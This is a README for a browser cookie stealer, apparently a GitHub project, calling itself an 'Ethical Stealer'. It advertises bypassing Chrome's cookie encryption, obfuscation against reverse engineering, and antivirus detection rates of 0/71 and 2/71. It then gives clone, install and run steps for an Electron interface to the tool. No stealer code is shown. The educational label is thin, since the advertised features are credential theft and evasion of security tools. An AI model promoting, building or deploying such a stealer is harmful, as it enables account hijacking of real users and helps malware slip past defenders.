## Features üöÄ

- **Ethical Stealer**: A tool designed for educational and proof of concept purposes.
- **Bypasses Chrome's Latest Cookie Encryption**: Leveraging **Bun** for its rapid speed and robust obfuscation to bypass modern encryption techniques used by Chrome.
- **Compiled with Bun and `pkg`**: Offering minimal detection rates (0/71 with Bun, 2/71 with `pkg`).
- **New special detection bypass with `pkg-fud-method`**: Offering 0 detection rates.
- **Obfuscation**: Using `javascript-obfuscator` & `js-confuser` for basic => hard obfuscation to prevent reverse engineering.

## Installation ‚öôÔ∏è

Before you begin, ensure that you have the following dependencies installed:

1. **Python 3.9 or above**: You can download the latest version of Python from [python.org](https://www.python.org/downloads/).

2. **Node.js Version lower than v21 (v16 recommended)**: Download and install Node.js from [Node.js v16 download](https://nodejs.org/dist/v16.20.2/node-v16.20.2-x64.msi).

3. [**Visual Studio Installer**](https://visualstudio.microsoft.com/downloads/) (for C++ support): Download and install Visual Studio with the **Desktop development with C++** workload. This is required for building and compiling C++ modules in the project.

4. **Bun**: This will be automatically installed when you run the `start.bat` script.

5. **`pkg`**: Also installed automatically via the `start.bat` script.

To install all dependencies:
- Run `start.bat` to install electron, Bun, and `pkg` automatically.


## How to Run üñ•Ô∏è

1. **Clone the repository**:
   ```bash
   git clone https://github.com/wompless/Loud-Project.git
   cd Loud-Project
   ```

2. **Install dependencies**:
   ```bash
   node install.js
   ```

3. **Start the application**:
   - Recommended: Run `start.bat` to handle everything.
   - Or manually run:
     ```bash
     npm start
     ```

4. A GUI built with **Electron** will open where you can interact with the tool.

## Why Bun is Incredible üèéÔ∏è

**Bun** is a modern, ultra-fast JavaScript runtime. By using Bun, we achieve **significant speed improvements** in both execution and build times.

- **Detection rate with Bun: 0%**
- **Detection rate with pkg: 2%**

It optimizes Chrome cookie decryption bypasses with **minimal overhead**.
